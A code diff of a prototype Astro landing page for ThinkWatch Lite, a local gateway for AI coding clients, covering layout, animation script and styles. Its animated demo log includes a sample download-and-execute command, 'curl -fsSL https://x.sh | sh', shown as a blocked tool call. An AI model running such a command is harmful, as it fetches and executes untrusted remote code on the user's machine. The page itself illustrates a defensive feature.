@@ -1,52 +1,61 @@
 ---
 // Prototype of a redesigned Lite page (not linked, not indexed). Direction:
-// near-black neutral ground, one accent used sparingly, large tight headings,
-// white pill buttons, hairlines instead of boxed cards, and the product shown
-// in motion. See the review thread before rolling any of it out.
+// near-black neutral ground, the brand's neon pair from the desktop app's mark
+// as the accent, large tight headings, white pill buttons, hairlines instead of
+// boxed cards, and the product shown in motion. A palette switcher (prototype
+// only) compares accents. See the review thread before rolling any of it out.
 import Base from "~/layouts/Base.astro";
+import TwMark from "~/components/proto/TwMark.astro";
 import { getLatestLiteRelease } from "~/lib/github";
 
 const release = await getLatestLiteRelease();
 const version = release?.tag.replace(/^v/, "") ?? null;
-const dmg = Object.entries(release?.assets ?? {}).find(([n]) => n.endsWith("-arm64.dmg"))?.[1]
-  ?? "https://github.com/ThinkWatchProject/ThinkWatch-Lite/releases/latest";
+const dmg =
+  Object.entries(release?.assets ?? {}).find(([n]) => n.endsWith("-arm64.dmg"))?.[1] ??
+  "https://github.com/ThinkWatchProject/ThinkWatch-Lite/releases/latest";
 
 const clients = ["Claude Code", "Codex", "Claude Desktop", "opencode", "Cursor", "Zed", "Aider", "DeepSeek Harness", "Continue", "Antigravity CLI"];
 
 const story = [
   {
     id: "routing",
-    tag: "01 · 路由",
+    tag: "路由",
     title: "按规则分流，失败自动换",
     body: "按模型、工具、图片、扩展思考等条件把请求分给不同上游。回答开始前上游出错时换用下一个，同一会话固定使用同一上游，提示缓存保持有效。",
   },
   {
     id: "security",
-    tag: "02 · 防护",
+    tag: "防护",
     title: "密钥不交给中转站，恶意工具调用到不了本机",
     body: "请求发出前，API 密钥、私钥与 JWT 可以换成占位符；回答里若出现下载即执行、外发凭据之类的工具调用，会在客户端执行之前被切断。",
   },
   {
     id: "traffic",
-    tag: "03 · 追溯",
+    tag: "追溯",
     title: "每个请求都说得清去向",
     body: "命中的规则、尝试过的每个上游、格式转换与费用依据，都在请求详情里。已结束的请求可以重放到另一个上游，并排对比。",
   },
   {
     id: "overview",
-    tag: "04 · 费用",
+    tag: "费用",
     title: "费用如实计算",
     body: "按模型与上游统计 token、费用、缓存节省与首 token 时间。估算的金额单独标注，无法计价的请求单独计数，不按零计入。",
   },
 ];
+
+const palettes = [
+  { id: "neon", label: "霓虹双色（logo 同款）" },
+  { id: "teal", label: "现在的青色" },
+  { id: "indigo", label: "靛紫" },
+  { id: "amber", label: "暖橙" },
+];
 ---
 
 <Base title="ThinkWatch Lite · 原型" description="Lite 页重新设计的原型" noindex analytics={false}>
-  <div class="proto">
-    <!-- Nav: slim, translucent, one white pill -->
+  <div class="proto" data-palette="neon">
     <header class="nav">
       <div class="wrap nav-inner">
-        <a href="/zh-CN/" class="brand"><img src="/favicon.svg" alt="" width="20" height="20" />ThinkWatch</a>
+        <a href="/zh-CN/" class="brand"><TwMark id="m-nav" size={22} />ThinkWatch</a>
         <nav class="nav-links" aria-label="主导航">
           <a href="/zh-CN/lite/" aria-current="page">Lite</a>
           <a href="/zh-CN/thinkwatch/">企业版</a>
@@ -63,110 +72,119 @@ const story = [
 
     <!-- Hero -->
     <section class="hero">
-      <div class="glow" aria-hidden="true"></div>
-      <div class="wrap">
-        <a class="announce" href="/zh-CN/changelog/"><span class="dot"></span>{version ? `Lite ${version} 已发布` : "Lite 已发布"}<span class="chev">→</span></a>
-        <h1 class="h-hero">Claude Code、Codex 等<br />AI 客户端的本地网关</h1>
-        <div class="hero-row">
-          <p class="lede">客户端只接入一次，之后换上游、换模型都在网关里完成。每个请求的费用与去向都有记录，密钥不交给中转站，恶意工具调用到不了本机。</p>
-          <div class="hero-actions">
-            <a class="pill" href={dmg}>下载 macOS 版</a>
+      <div class="aurora" aria-hidden="true"><i></i><i></i><i></i></div>
+      <div class="grid-bg" aria-hidden="true"></div>
+      <div class="wrap hero-grid">
+        <div class="hero-copy">
+          <a class="announce" href="/zh-CN/changelog/"><span class="dot"></span>{version ? `Lite ${version} 已发布` : "Lite 已发布"}<span class="chev">→</span></a>
+          <h1 class="h-hero">
+            <span class="line" style="--d:0">Claude Code、Codex 等</span>
+            <span class="line" style="--d:1">AI 客户端的<span class="grad">本地网关</span></span>
+          </h1>
+          <p class="lede rise" style="--d:2">客户端只接入一次，之后换上游、换模型都在网关里完成。每个请求的费用与去向都有记录，密钥不交给中转站，恶意工具调用到不了本机。</p>
+          <div class="hero-actions rise" style="--d:3">
+            <a class="pill shine" href={dmg}>下载 macOS 版</a>
             <a class="ghost" href="#download">Windows 与 Linux</a>
           </div>
         </div>
+        <div class="hero-mark" aria-hidden="true">
+          <div class="mark-halo"></div>
+          <TwMark id="m-hero" size={260} draw glow />
+        </div>
+      </div>
 
-        <!-- The product in motion: one request through the gateway -->
-        <figure class="flow" data-flow aria-label="示意：一个 Claude Code 请求经过网关，被路由、替换密钥、切断危险工具调用，并记下费用">
+      <div class="wrap">
+        <figure class="flow rise" style="--d:4" data-flow aria-label="示意：请求经过网关，依次展示正常请求脱敏、上游出错时换用下一个、危险工具调用被切断">
           <div class="flow-top">
             <span class="lights"><i></i><i></i><i></i></span>
             <span class="flow-title">ThinkWatch Lite · 实时流量</span>
+            <span class="scenes" data-scenes><i data-on></i><i></i><i></i></span>
             <span class="live"><i></i>LIVE</span>
           </div>
           <div class="flow-grid" aria-hidden="true">
-            <div class="col">
+            <div class="col" data-clients>
               <p class="col-label">客户端</p>
-              <div class="node on">Claude Code</div>
+              <div class="node">Claude Code</div>
               <div class="node">Codex</div>
               <div class="node">Cursor</div>
             </div>
-            <div class="wire"><span class="packet"></span></div>
+            <div class="wire"><span class="packet"></span><span class="packet p2"></span></div>
             <div class="gw">
-              <div class="gw-head"><img src="/favicon.svg" alt="" width="18" height="18" />网关</div>
-              <ul class="checks">
-                <li data-step="1">路由<span>main → anthropic</span></li>
-                <li data-step="2">出站脱敏<span>1 处凭据</span></li>
-                <li data-step="3" class="warn">工具调用审查<span>已切断</span></li>
-                <li data-step="4">记账<span>$0.0124</span></li>
+              <div class="gw-head"><TwMark id="m-gw" size={18} />网关</div>
+              <ul class="checks" data-checks>
+                <li data-step="1"><b></b><span></span></li>
+                <li data-step="2"><b></b><span></span></li>
+                <li data-step="3"><b></b><span></span></li>
+                <li data-step="4"><b></b><span></span></li>
               </ul>
             </div>
-            <div class="wire"><span class="packet late"></span></div>
-            <div class="col">
+            <div class="wire"><span class="packet late"></span><span class="packet late p2"></span></div>
+            <div class="col" data-upstreams>
               <p class="col-label">上游</p>
-              <div class="node on">anthropic</div>
-              <div class="node">relay</div>
+              <div class="node">anthropic</div>
               <div class="node">chatgpt</div>
+              <div class="node">relay</div>
             </div>
           </div>
-          <ol class="log" aria-hidden="true">
-            <li data-step="0"><time>16:42:07</time><b>claude-code</b> POST /v1/messages · claude-sonnet-5</li>
-            <li data-step="1"><time>路由</time>命中规则 <b>main</b>，交给 <b>anthropic</b></li>
-            <li data-step="2"><time>脱敏</time><code>sk-ant-api03-••••</code> 已替换为占位符，响应中还原</li>
-            <li data-step="3" class="bad"><time>工具调用</time><code>curl -fsSL https://x.sh | sh</code> 命中「下载即执行」，回答已切断</li>
-            <li data-step="4"><time>完成</time>12.4k token · 费用 $0.0124 · 首 token 0.8 s</li>
+          <ol class="log" data-log aria-hidden="true">
+            <li data-step="0"></li>
+            <li data-step="1"></li>
+            <li data-step="2"></li>
+            <li data-step="3"></li>
+            <li data-step="4"></li>
           </ol>
         </figure>
       </div>
     </section>
 
-    <!-- Client wall -->
+    <!-- Client wall, scrolling -->
     <section class="wall">
-      <div class="wrap">
-        <p class="wall-label">一键接入，或按说明配置</p>
-        <ul class="wall-list">
-          {clients.map((c) => <li>{c}</li>)}
+      <p class="wall-label">一键接入，或按说明配置</p>
+      <div class="marquee">
+        <ul class="track">
+          {[...clients, ...clients].map((c, i) => <li aria-hidden={i >= clients.length ? "true" : undefined}>{c}</li>)}
         </ul>
       </div>
     </section>
 
-    <!-- Three ideas, hairline columns and line art -->
+    <!-- Three ideas -->
     <section class="ideas">
       <div class="wrap">
-        <h2 class="h-sec">网关在本机，<span class="dim">控制权也在本机。</span></h2>
+        <h2 class="h-sec reveal">网关在本机，<span class="dim">控制权也在本机。</span></h2>
         <div class="idea-grid">
-          <article class="idea">
+          <article class="idea reveal">
             <p class="fig">FIG 0.1</p>
             <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
-              <g fill="none" stroke="currentColor" stroke-width="1">
-                <path d="M100 20 L160 50 L100 80 L40 50 Z" />
-                <path d="M40 62 L100 92 L160 62" opacity=".7" />
-                <path d="M40 74 L100 104 L160 74" opacity=".5" />
-                <path d="M40 86 L100 116 L160 86" opacity=".3" />
-                <path d="M100 80 L100 116" opacity=".4" />
+              <g class="float">
+                <path pathLength="1" d="M100 20 L160 50 L100 80 L40 50 Z" class="ink hot" />
+                <path pathLength="1" d="M40 62 L100 92 L160 62" class="ink" style="opacity:.7" />
+                <path pathLength="1" d="M40 74 L100 104 L160 74" class="ink" style="opacity:.5" />
+                <path pathLength="1" d="M40 86 L100 116 L160 86" class="ink" style="opacity:.3" />
               </g>
             </svg>
             <h3>一次接入，随时切换</h3>
             <p>七款客户端一键指向网关，写入前预览改动、备份原文件。之后换上游、换模型，客户端无需改配置或重启。</p>
           </article>
-          <article class="idea">
+          <article class="idea reveal">
             <p class="fig">FIG 0.2</p>
             <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
-              <g fill="none" stroke="currentColor" stroke-width="1">
-                <path d="M100 18 L146 34 V70 C146 96 126 112 100 122 C74 112 54 96 54 70 V34 Z" />
-                <path d="M100 30 L134 42 V70 C134 90 120 102 100 110 C80 102 66 90 66 70 V42 Z" opacity=".5" />
-                <circle cx="100" cy="66" r="9" />
-                <path d="M100 75 V90" />
+              <g class="float f2">
+                <path pathLength="1" d="M100 18 L146 34 V70 C146 96 126 112 100 122 C74 112 54 96 54 70 V34 Z" class="ink hot" />
+                <path pathLength="1" d="M100 30 L134 42 V70 C134 90 120 102 100 110 C80 102 66 90 66 70 V42 Z" class="ink" style="opacity:.5" />
+                <circle pathLength="1" cx="100" cy="66" r="9" class="ink" />
+                <path pathLength="1" d="M100 75 V90" class="ink" />
               </g>
             </svg>
             <h3>防范中转站</h3>
             <p>密钥在发出前替换，中转站拿不到原值；回答里塞进来的危险工具调用，在客户端执行之前切断。</p>
           </article>
-          <article class="idea">
+          <article class="idea reveal">
             <p class="fig">FIG 0.3</p>
             <svg viewBox="0 0 200 140" class="art" aria-hidden="true">
-              <g fill="none" stroke="currentColor" stroke-width="1">
-                <path d="M30 110 H170" opacity=".4" />
-                <path d="M40 110 V60 M62 110 V44 M84 110 V70 M106 110 V32 M128 110 V56 M150 110 V40" />
-                <circle cx="106" cy="32" r="4" />
+              <g class="float f3">
+                <path pathLength="1" d="M30 110 H170" class="ink" style="opacity:.4" />
+                <path pathLength="1" d="M40 110 V60 M62 110 V44 M84 110 V70 M106 110 V32 M128 110 V56 M150 110 V40" class="ink" />
+                <circle pathLength="1" cx="106" cy="32" r="4" class="ink hot" />
               </g>
             </svg>
             <h3>每个请求都可追溯</h3>
@@ -176,21 +194,22 @@ const story = [
       </div>
     </section>
 
-    <!-- Scroll story: text on the left, one sticky screen on the right -->
+    <!-- Scroll story -->
     <section class="story" data-story>
       <div class="wrap story-grid">
         <div class="story-steps">
-          <h2 class="h-sec">一个请求，<span class="dim">经过网关的四站。</span></h2>
+          <h2 class="h-sec reveal">一个请求，<span class="dim">经过网关的四站。</span></h2>
+          <div class="rail" aria-hidden="true"><i data-rail></i></div>
           {story.map((s, i) => (
             <div class="step" data-step-id={s.id} data-active={i === 0 ? "" : undefined}>
-              <p class="step-tag">{s.tag}</p>
+              <p class="step-tag"><span>0{i + 1}</span>{s.tag}</p>
               <h3>{s.title}</h3>
               <p>{s.body}</p>
             </div>
           ))}
         </div>
         <div class="story-screen">
-          <div class="screen">
+          <div class="screen" data-tilt>
             {story.map((s, i) => (
               <img src={`/lite/${s.id}.webp`} alt="" width="2360" height="1540" loading="lazy" data-shot={s.id} data-active={i === 0 ? "" : undefined} />
             ))}
@@ -202,53 +221,58 @@ const story = [
     <!-- Bento -->
     <section class="bento-sec">
       <div class="wrap">
-        <h2 class="h-sec">还有这些，<span class="dim">都在一个应用里。</span></h2>
-        <div class="bento">
-          <article class="tile t-menubar">
+        <h2 class="h-sec reveal">还有这些，<span class="dim">都在一个应用里。</span></h2>
+        <div class="bento" data-bento>
+          <article class="tile t-menubar reveal">
             <div class="tile-text">
+              <div class="chip-bar" aria-hidden="true">
+                <TwMark id="m-chip" size={16} />
+                <span class="chip-nums"><b data-count="13.3" data-unit="M" data-step="0.1">13.3M</b><b data-count="9.34" data-prefix="$" data-step="0.03" data-fixed="2">$9.34</b></span>
+              </div>
               <h3>菜单栏里的今日用量</h3>
               <p>今日 token 与费用常驻菜单栏，额度将尽变橙、用完变红；点开看各项额度与进行中的请求。Windows 与 Linux 在托盘。</p>
             </div>
             <img src="/lite/menubar-menu.webp" alt="" width="664" height="1072" loading="lazy" class="menu-shot" />
           </article>
-          <article class="tile t-cost">
-            <p class="big">$68.11</p>
+          <article class="tile t-cost reveal">
+            <p class="big"><span data-count="68.11" data-prefix="$" data-step="0.07" data-fixed="2">$68.11</span></p>
             <p class="big-sub">含估算 $0.441 · 13 条无法计价</p>
             <h3>估算与实测分开写</h3>
             <p>无法计价的请求单独计数，不当作零。</p>
           </article>
-          <article class="tile t-formats">
+          <article class="tile t-formats reveal">
             <div class="chips" aria-hidden="true">
               <span>Anthropic Messages</span><span>OpenAI Chat</span><span>OpenAI Responses</span><span>Gemini</span>
             </div>
             <h3>四种接口自动互转</h3>
             <p>Codex 也能用只支持 Chat Completions 的模型。</p>
           </article>
-          <article class="tile t-mcp">
-            <img src="/lite/mcp.webp" alt="" width="2360" height="1540" loading="lazy" class="crop" />
+          <article class="tile t-mcp reveal">
+            <div class="crop-wrap"><img src="/lite/mcp.webp" alt="" width="2360" height="1540" loading="lazy" class="crop" /><span class="scan" aria-hidden="true"></span></div>
             <div class="tile-text">
               <h3>扫描 MCP、技能与钩子</h3>
               <p>八款客户端的 MCP 服务器并列显示，隐藏字符、提示注入与危险命令会被找出。</p>
             </div>
           </article>
-          <article class="tile t-remote">
+          <article class="tile t-remote reveal">
             <svg viewBox="0 0 240 90" class="remote-art" aria-hidden="true">
               <g fill="none" stroke="currentColor" stroke-width="1">
                 <rect x="10" y="25" width="64" height="40" rx="6" />
                 <rect x="166" y="20" width="64" height="50" rx="6" />
                 <path d="M74 45 H166" stroke-dasharray="3 4" class="dash" />
               </g>
+              <circle r="3" class="dot-run"><animateMotion dur="1.8s" repeatCount="indefinite" path="M74 45 H166" /></circle>
               <text x="42" y="49" text-anchor="middle">Lite</text>
               <text x="198" y="49" text-anchor="middle">twcore</text>
             </svg>
             <h3>也能管理服务器上的网关</h3>
             <p>twcore 装在 Linux 服务器上，应用经 Noise 加密通道连接，不涉及证书。</p>
           </article>
-          <article class="tile t-keys">
+          <article class="tile t-keys reveal">
             <ul class="keyrows" aria-hidden="true">
-              <li><b>claude-code</b><span>main</span><em>$4.21</em></li>
-              <li><b>codex</b><span>main</span><em>$2.87</em></li>
-              <li><b>cursor</b><span>budget</span><em>$0.93</em></li>
+              <li><b>claude-code</b><span>main</span><em data-count="4.21" data-prefix="$" data-step="0.02" data-fixed="2">$4.21</em></li>
+              <li><b>codex</b><span>main</span><em data-count="2.87" data-prefix="$" data-step="0.01" data-fixed="2">$2.87</em></li>
+              <li><b>cursor</b><span>budget</span><em data-count="0.93" data-prefix="$" data-step="0.01" data-fixed="2">$0.93</em></li>
             </ul>
             <h3>每个客户端一把密钥</h3>
             <p>流量与费用按客户端分开，路由与可见模型各自设置。</p>
@@ -259,64 +283,203 @@ const story = [
 
     <!-- Download -->
     <section class="cta" id="download">
-      <div class="glow glow-low" aria-hidden="true"></div>
+      <div class="cta-glow" aria-hidden="true"></div>
       <div class="wrap cta-inner">
-        <h2 class="h-cta">下载 ThinkWatch Lite</h2>
+        <TwMark id="m-cta" size={72} glow />
+        <h2 class="h-cta reveal">下载 ThinkWatch Lite</h2>
         <p class="lede center">macOS 12 及以上（Apple silicon）、Windows 10 21H2 及以上（x64、ARM64）、Linux（x86_64、aarch64）。MIT 开源，自动更新。</p>
         <div class="hero-actions center">
-          <a class="pill" href={dmg}>下载 macOS 版</a>
+          <a class="pill shine" href={dmg}>下载 macOS 版</a>
           <a class="ghost" href="/zh-CN/lite/#install">Windows 与 Linux</a>
         </div>
-        <div class="cmd"><span>$</span> brew install --cask thinkwatchproject/tap/thinkwatch-lite</div>
+        <div class="cmd"><span>$</span> <code data-type="brew install --cask thinkwatchproject/tap/thinkwatch-lite">brew install --cask thinkwatchproject/tap/thinkwatch-lite</code><i class="caret" aria-hidden="true"></i></div>
       </div>
     </section>
 
     <footer class="foot">
       <div class="wrap foot-inner">
-        <span class="brand"><img src="/favicon.svg" alt="" width="16" height="16" />ThinkWatch</span>
+        <span class="brand"><TwMark id="m-foot" size={18} />ThinkWatch</span>
         <span class="dim">原型 · 不代表最终设计</span>
       </div>
     </footer>
+
+    <!-- Prototype only: compare accents -->
+    <div class="palette" role="group" aria-label="配色（原型）">
+      <span class="palette-label">配色</span>
+      {palettes.map((p) => (
+        <button type="button" data-set-palette={p.id} class={`sw sw-${p.id}`} title={p.label} aria-label={p.label} aria-pressed={p.id === "neon" ? "true" : "false"}></button>
+      ))}
+    </div>
   </div>
 </Base>
 
 <script is:inline>
   (() => {
+    const root = document.querySelector(".proto");
     const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
 
-    // Hero: step through one request, then start again.
+    // Palette switcher (prototype only).
+    const setPalette = (id) => {
+      root.dataset.palette = id;
+      document.querySelectorAll("[data-set-palette]").forEach((b) => b.setAttribute("aria-pressed", String(b.dataset.setPalette === id)));
+      try { localStorage.setItem("proto-palette", id); } catch {}
+    };
+    try { const saved = localStorage.getItem("proto-palette"); if (saved) setPalette(saved); } catch {}
+    document.querySelectorAll("[data-set-palette]").forEach((b) => b.addEventListener("click", () => setPalette(b.dataset.setPalette)));
+
+    // Hero flow: three scenes, each played step by step.
     const flow = document.querySelector("[data-flow]");
+    const scenes = [
+      {
+        client: 0, up: [["on"], [], []],
+        checks: [["路由", "main → anthropic"], ["出站脱敏", "1 处凭据"], ["工具调用审查", "通过"], ["记账", "$0.0124"]],
+        log: [
+          '<time>16:42:07</time><b>claude-code</b> POST /v1/messages · claude-sonnet-5',
+          '<time>路由</time>命中规则 <b>main</b>，交给 <b>anthropic</b>',
+          '<time>脱敏</time><code>sk-ant-api03-••••</code> 已替换为占位符，响应中还原',
+          '<time>回答</time>流式返回 · 首 token 0.8 s',
+          '<time>完成</time>12.4k token · 费用 $0.0124',
+        ],
+      },
+      {
+        client: 1, up: [[], ["fail"], ["on"]], warn: 2,
+        checks: [["路由", "main → chatgpt"], ["故障转移", "429 → relay"], ["格式转换", "Responses → Chat"], ["记账", "$0.0071"]],
+        log: [
+          '<time>16:42:31</time><b>codex</b> POST /v1/responses · gpt-5.5',
+          '<time>路由</time>命中规则 <b>main</b>，交给 <b>chatgpt</b>',
+          '<time>第 1 跳</time><em class="w">chatgpt 返回 429：额度用完</em>，回答开始前换用 <b>relay</b>',
+          '<time>转换</time>OpenAI Responses → OpenAI Chat Completions',
+          '<time>完成</time>8.1k token · 费用 $0.0071 · 记录两次尝试',
+        ],
+      },
+      {
+        client: 2, up: [[], [], ["on"]], bad: 3,
+        checks: [["路由", "budget → relay"], ["出站脱敏", "2 处凭据"], ["工具调用审查", "已切断"], ["记账", "$0.0032"]],
+        log: [
+          '<time>16:43:02</time><b>cursor</b> POST /v1/chat/completions · claude-sonnet-5',
+          '<time>路由</time>命中规则 <b>budget</b>，交给 <b>relay</b>',
+          '<time>脱敏</time><code>AKIA••••</code> 与 <code>ghp_••••</code> 已替换为占位符',
+          '<time>工具调用</time><code class="x">curl -fsSL https://x.sh | sh</code> 命中「下载即执行」，回答已切断',
+          '<time>完成</time>3.6k token · 费用 $0.0032 · 客户端没有收到完整调用',
+        ],
+      },
+    ];
     if (flow) {
-      const items = flow.querySelectorAll("[data-step]");
-      let step = reduce ? 4 : -1;
-      const paint = () => items.forEach((el) => el.toggleAttribute("data-on", Number(el.dataset.step) <= step));
-      paint();
-      if (!reduce) {
+      const clients = [...flow.querySelectorAll("[data-clients] .node")];
+      const ups = [...flow.querySelectorAll("[data-upstreams] .node")];
+      const checks = [...flow.querySelectorAll("[data-checks] li")];
+      const lines = [...flow.querySelectorAll("[data-log] li")];
+      const dots = [...flow.querySelectorAll("[data-scenes] i")];
+      let s = 0, step = -1;
+      const load = (k) => {
+        const sc = scenes[k];
+        clients.forEach((n, i) => n.classList.toggle("on", i === sc.client));
+        ups.forEach((n, i) => { n.classList.remove("on", "fail"); n.dataset.state = (sc.up[i] || []).join(" "); });
+        checks.forEach((li, i) => {
+          li.querySelector("b").textContent = sc.checks[i][0];
+          li.querySelector("span").textContent = sc.checks[i][1];
+          li.classList.toggle("warn", sc.warn === i + 1);
+          li.classList.toggle("bad", sc.bad === i + 1);
+        });
+        lines.forEach((li, i) => { li.innerHTML = sc.log[i]; li.classList.toggle("bad", sc.bad === i); li.classList.toggle("warnl", sc.warn === i); });
+        dots.forEach((d, i) => d.toggleAttribute("data-on", i === k));
+      };
+      const paint = () => {
+        [...checks, ...lines].forEach((el) => el.toggleAttribute("data-on", Number(el.dataset.step) <= step));
+        ups.forEach((n) => {
+          const st = n.dataset.state || "";
+          n.classList.toggle("fail", st.includes("fail") && step >= 2);
+          n.classList.toggle("on", st.includes("on") && step >= (scenes[s].warn ? 2 : 1));
+        });
+        flow.toggleAttribute("data-running", step >= 0 && step <= 4);
+      };
+      load(0);
+      if (reduce) { step = 4; paint(); }
+      else {
+        paint();
         setInterval(() => {
-          step = step >= 6 ? -1 : step + 1;
-          flow.toggleAttribute("data-running", step >= 0 && step <= 4);
+          step++;
+          if (step > 6) { s = (s + 1) % scenes.length; load(s); step = -1; }
           paint();
-        }, 900);
+        }, 850);
       }
     }
 
-    // Story: the step nearest the middle of the screen picks the screenshot.
+    // Story: the step at the middle of the screen picks the screenshot; the rail fills.
     const story = document.querySelector("[data-story]");
     if (story) {
       const steps = [...story.querySelectorAll("[data-step-id]")];
       const shots = [...story.querySelectorAll("[data-shot]")];
-      const io = new IntersectionObserver(
-        (entries) => {
-          for (const e of entries) {
-            if (!e.isIntersecting) continue;
-            const id = e.target.dataset.stepId;
-            steps.forEach((s) => s.toggleAttribute("data-active", s === e.target));
-            shots.forEach((s) => s.toggleAttribute("data-active", s.dataset.shot === id));
-          }
-        },
-        { rootMargin: "-45% 0px -45% 0px" },
-      );
-      steps.forEach((s) => io.observe(s));
+      const rail = story.querySelector("[data-rail]");
+      const io = new IntersectionObserver((entries) => {
+        for (const e of entries) {
+          if (!e.isIntersecting) continue;
+          const id = e.target.dataset.stepId;
+          steps.forEach((x) => x.toggleAttribute("data-active", x === e.target));
+          shots.forEach((x) => x.toggleAttribute("data-active", x.dataset.shot === id));
+        }
+      }, { rootMargin: "-45% 0px -45% 0px" });
+      steps.forEach((x) => io.observe(x));
+      const fill = () => {
+        const first = steps[0].getBoundingClientRect(), last = steps[steps.length - 1].getBoundingClientRect();
+        const mid = innerHeight / 2;
+        const p = Math.min(1, Math.max(0, (mid - first.top) / (last.bottom - first.top)));
+        rail.style.transform = `scaleY(${p})`;
+      };
+      addEventListener("scroll", fill, { passive: true }); fill();
+      const tilt = story.querySelector("[data-tilt]");
+      if (tilt && !reduce) {
+        tilt.addEventListener("pointermove", (e) => {
+          const r = tilt.getBoundingClientRect();
+          const x = (e.clientX - r.left) / r.width - 0.5, y = (e.clientY - r.top) / r.height - 0.5;
+          tilt.style.transform = `perspective(1400px) rotateY(${x * 4}deg) rotateX(${-y * 4}deg)`;
+        });
+        tilt.addEventListener("pointerleave", () => (tilt.style.transform = ""));
+      }
+    }
+
+    // Bento: a light that follows the pointer.
+    document.querySelectorAll(".tile").forEach((t) => {
+      t.addEventListener("pointermove", (e) => {
+        const r = t.getBoundingClientRect();
+        t.style.setProperty("--mx", `${e.clientX - r.left}px`);
+        t.style.setProperty("--my", `${e.clientY - r.top}px`);
+      });
+    });
+
+    if (reduce) return;
+
+    // Entrances: mark blocks as they come into view.
+    root.classList.add("js-reveal");
+    const rio = new IntersectionObserver((entries) => {
+      for (const e of entries) if (e.isIntersecting) { e.target.setAttribute("data-in", ""); rio.unobserve(e.target); }
+    }, { rootMargin: "0px 0px -8% 0px" });
+    document.querySelectorAll(".reveal").forEach((el) => rio.observe(el));
+
+    // Counters that tick up while on screen.
+    const counters = [...document.querySelectorAll("[data-count]")];
+    setInterval(() => {
+      counters.forEach((el) => {
+        if (Math.random() < 0.55) return;
+        const v = (parseFloat(el.dataset.count) + parseFloat(el.dataset.step) * (0.5 + Math.random()));
+        el.dataset.count = String(v);
+        const txt = (el.dataset.prefix || "") + v.toFixed(Number(el.dataset.fixed || 1)) + (el.dataset.unit || "");
+        el.textContent = txt;
+        el.classList.remove("tick"); void el.offsetWidth; el.classList.add("tick");
+      });
+    }, 1400);
+
+    // The install command types itself once when it comes into view.
+    const code = document.querySelector("[data-type]");
+    if (code) {
+      const full = code.dataset.type;
+      const io2 = new IntersectionObserver(([e]) => {
+        if (!e.isIntersecting) return;
+        io2.disconnect();
+        let i = 0; code.textContent = "";
+        const t = setInterval(() => { code.textContent = full.slice(0, ++i); if (i >= full.length) clearInterval(t); }, 28);
+      }, { threshold: 0.6 });
+      io2.observe(code);
     }
   })();
 </script>
@@ -329,6 +492,7 @@ const story = [
 
 <style>
   .proto {
+    /* Layout: one 1200px column; hero splits copy and mark; sections separated by hairlines */
     --bg: #08090a;
     --panel: #0f1012;
     --panel-2: #141518;
@@ -337,13 +501,36 @@ const story = [
     --text: #f7f8f8;
     --muted: #8a8f98;
     --faint: #62666d;
-    --accent: #3ddbd9;
     --danger: #ff6b6b;
+    --warn: #f5b454;
+    /* accent pair, as RGB triples for alpha and as hex for SVG stops */
+    --a1: 34 229 242;
+    --a2: 240 92 216;
+    --a1-hex: #22e5f2;
+    --a2-hex: #f05cd8;
     color: var(--text);
     background: var(--bg);
     font-family: var(--font-sans);
     -webkit-font-smoothing: antialiased;
     overflow-x: clip;
+  }
+  .proto[data-palette="teal"] {
+    --a1: 61 219 217;
+    --a2: 142 235 234;
+    --a1-hex: #3ddbd9;
+    --a2-hex: #8eebea;
+  }
+  .proto[data-palette="indigo"] {
+    --a1: 129 140 248;
+    --a2: 192 132 252;
+    --a1-hex: #818cf8;
+    --a2-hex: #c084fc;
+  }
+  .proto[data-palette="amber"] {
+    --a1: 251 146 60;
+    --a2: 250 204 21;
+    --a1-hex: #fb923c;
+    --a2-hex: #facc15;
   }
   .wrap {
     max-width: 1200px;
@@ -353,6 +540,12 @@ const story = [
   .dim {
     color: var(--muted);
   }
+  .grad {
+    background: linear-gradient(90deg, rgb(var(--a1)), rgb(var(--a2)));
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+  }
 
   /* Nav */
   .nav {
@@ -360,7 +553,7 @@ const story = [
     top: 0;
     z-index: 20;
     border-bottom: 1px solid var(--line);
-    background: rgba(8, 9, 10, 0.7);
+    background: rgba(8, 9, 10, 0.72);
     backdrop-filter: saturate(160%) blur(14px);
   }
   .nav-inner {
@@ -373,7 +566,7 @@ const story = [
   .brand {
     display: inline-flex;
     align-items: center;
-    gap: 8px;
+    gap: 9px;
     font-weight: 600;
     font-size: 15px;
     letter-spacing: -0.01em;
@@ -383,6 +576,9 @@ const story = [
     gap: 28px;
     font-size: 14px;
     color: var(--muted);
+  }
+  .nav-links a {
+    transition: color 150ms;
   }
   .nav-links a:hover,
   .nav-links a[aria-current] {
@@ -408,6 +604,8 @@ const story = [
 
   /* Buttons */
   .pill {
+    position: relative;
+    overflow: hidden;
     display: inline-flex;
     height: 44px;
     align-items: center;
@@ -417,11 +615,20 @@ const story = [
     font-size: 15px;
     font-weight: 560;
     color: #08090a;
-    transition: background 160ms, transform 160ms;
+    transition: background 160ms, transform 160ms, box-shadow 160ms;
   }
   .pill:hover {
     background: #fff;
     transform: translateY(-1px);
+    box-shadow: 0 8px 30px -8px rgb(var(--a1) / 0.5);
+  }
+  .shine::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(110deg, transparent 30%, rgba(255, 255, 255, 0.7) 50%, transparent 70%);
+    transform: translateX(-120%);
+    animation: shine 4.5s ease-in-out 2s infinite;
   }
   .pill-sm {
     height: 34px;
@@ -441,35 +648,104 @@ const story = [
   }
   .ghost:hover {
     background: rgba(255, 255, 255, 0.04);
-    border-color: rgba(255, 255, 255, 0.24);
+    border-color: rgba(255, 255, 255, 0.26);
   }
 
   /* Hero */
   .hero {
     position: relative;
-    padding: 88px 0 72px;
+    padding: 80px 0 72px;
+    isolation: isolate;
   }
-  .glow {
+  .aurora {
     position: absolute;
-    inset: -200px 0 auto;
-    height: 760px;
-    background:
-      radial-gradient(600px 300px at 70% 30%, rgba(61, 219, 217, 0.13), transparent 70%),
-      radial-gradient(500px 260px at 20% 10%, rgba(120, 140, 255, 0.08), transparent 70%);
+    inset: -160px 0 auto;
+    height: 820px;
+    z-index: -1;
     pointer-events: none;
-    /* fade out before the box ends, or its bottom edge shows as a band */
-    -webkit-mask-image: linear-gradient(#000 45%, transparent 95%);
-    mask-image: linear-gradient(#000 45%, transparent 95%);
+    -webkit-mask-image: linear-gradient(#000 40%, transparent 92%);
+    mask-image: linear-gradient(#000 40%, transparent 92%);
+    filter: blur(40px);
   }
-  .glow-low {
-    inset: auto 0 -120px;
-    height: 520px;
